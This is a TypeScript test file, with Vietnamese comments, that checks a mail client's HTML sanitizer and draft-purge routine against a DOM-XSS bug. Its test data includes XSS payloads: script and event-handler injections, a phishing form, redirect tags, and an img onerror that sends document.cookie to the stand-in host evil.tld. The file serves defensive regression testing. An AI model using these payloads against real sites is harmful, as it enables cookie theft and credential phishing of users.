import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import {
  escapeHtml,
  sanitizeMailHtml,
  purgeLegacyMailDraft,
  MAIL_DRAFT_VERSION,
} from '../utils/mailHtml';

/**
 * Regression coverage for the mail DOM-XSS (C1).
 *
 * The compose editor writes attacker-controlled markup into innerHTML
 * (ComposeModal.tsx). These tests run in the `node` environment, where
 * DOMPurify reports isSupported === false — which is exactly the fail-closed
 * branch we care about proving: with no DOM available, sanitizeMailHtml must
 * degrade to escaped text, never pass markup through.
 */

const XSS_VECTORS: Array<[string, string]> = [
  ['script tag', '<script>alert(document.cookie)</script>'],
  ['img onerror', '<img src=x onerror="fetch(\'//evil.tld?\'+document.cookie)">'],
  ['svg onload', '<svg/onload=alert(1)>'],
  ['body onload', '<body onload=alert(1)>'],
  ['iframe javascript url', '<iframe src="javascript:alert(1)"></iframe>'],
  ['anchor onmouseover', '<a href="#" onmouseover="alert(1)">click</a>'],
  ['form phishing', '<form action="//evil.tld"><input name="pw"><button>Login</button></form>'],
  ['meta refresh', '<meta http-equiv="refresh" content="0;url=//evil.tld">'],
  ['base tag', '<base href="//evil.tld/">'],
  ['object data', '<object data="//evil.tld/x.swf"></object>'],
  ['nested quote break', '"><img src=x onerror=alert(1)>'],
];

const DANGEROUS = /<\s*(script|img|svg|iframe|form|input|button|object|embed|meta|base|link)\b/i;

/**
 * Ở nhánh fail-closed (không có DOM) toàn bộ payload phải bị escape thành text.
 * `onerror=` vẫn xuất hiện dưới dạng ký tự văn bản, nhưng vì `<` đã thành `&lt;`
 * nên trình duyệt hiển thị nó chứ không tạo element — vì vậy điều kiện đúng là
 * "không còn dấu `<`/`>` thô", chứ không phải "không còn chuỗi onerror".
 */
const assertFullyEscaped = (out: string, name: string) => {
  expect(out, `${name}: không được còn dấu '<' thô`).not.toContain('<');
  expect(out, `${name}: không được còn dấu '>' thô`).not.toContain('>');
};

class MemoryStorage {
  private map = new Map<string, string>();
  getItem(k: string) { return this.map.has(k) ? this.map.get(k)! : null; }
  setItem(k: string, v: string) { this.map.set(k, String(v)); }
  removeItem(k: string) { this.map.delete(k); }
  clear() { this.map.clear(); }
}

describe('escapeHtml', () => {
  it('escape đủ 5 ký tự nguy hiểm', () => {
    expect(escapeHtml(`<>&"'`)).toBe('&lt;&gt;&amp;&quot;&#39;');
  });

  it('null/undefined trả chuỗi rỗng', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
  });

  it('escape payload ghép chuỗi vào blockquote (mail.from / mail.subject)', () => {
    const attacker = '<img src=x onerror=alert(1)>';
    expect(escapeHtml(attacker)).not.toContain('<');
    expect(escapeHtml(attacker)).toContain('&lt;img');
  });
});

describe('sanitizeMailHtml — fail closed without a DOM', () => {
  it('không trả về nguyên payload cho bất kỳ vector nào', () => {
    for (const [name, payload] of XSS_VECTORS) {
      const out = sanitizeMailHtml(payload);
      expect(out, `${name}: không được giữ tag nguy hiểm`).not.toMatch(DANGEROUS);
      assertFullyEscaped(out, name);
    }
  });

  it('mọi payload đều bị escape thành text, không mất nội dung đọc được', () => {
    const out = sanitizeMailHtml('<script>alert(1)</script>');
    expect(out).toContain('&lt;script&gt;');
    expect(out).toContain('alert(1)');
  });

  it('empty / null trả chuỗi rỗng', () => {
    expect(sanitizeMailHtml(null)).toBe('');
    expect(sanitizeMailHtml(undefined)).toBe('');
    expect(sanitizeMailHtml('')).toBe('');
  });

  it('HTML sạch vẫn giữ cấu trúc cơ bản khi có DOM', () => {
    // Không assert giá trị đầu ra (phụ thuộc môi trường), chỉ assert không lỗi.
    expect(() => sanitizeMailHtml('<p>Xin chào <b>bạn</b></p>')).not.toThrow();
  });
});

describe('purgeLegacyMailDraft — dọn draft nhiễm một lần', () => {
  let storage: MemoryStorage;

  beforeEach(() => {
    storage = new MemoryStorage();
    (globalThis as any).localStorage = storage;
  });
  afterEach(() => {
    delete (globalThis as any).localStorage;
  });

  it('xoá draft viết bởi bản build cũ, trả về true', () => {
    storage.setItem('mail_draft', JSON.stringify({ body: '<img src=x onerror=alert(1)>' }));
    expect(purgeLegacyMailDraft()).toBe(true);
    expect(storage.getItem('mail_draft')).toBeNull();
    expect(storage.getItem('mail_draft_version')).toBe(MAIL_DRAFT_VERSION);
  });

  it('không chạy lại lần hai — draft mới không bị xoá', () => {
    storage.setItem('mail_draft', JSON.stringify({ body: 'nội dung hợp lệ' }));
    purgeLegacyMailDraft();
    storage.setItem('mail_draft', JSON.stringify({ body: 'draft vừa gõ' }));

    expect(purgeLegacyMailDraft()).toBe(false);
    expect(storage.getItem('mail_draft')).toBe('{"body":"draft vừa gõ"}');
  });

  it('lần chạy đầu khi không có draft thì không ném lỗi', () => {
    expect(purgeLegacyMailDraft()).toBe(false);
    expect(storage.getItem('mail_draft_version')).toBe(MAIL_DRAFT_VERSION);
  });
});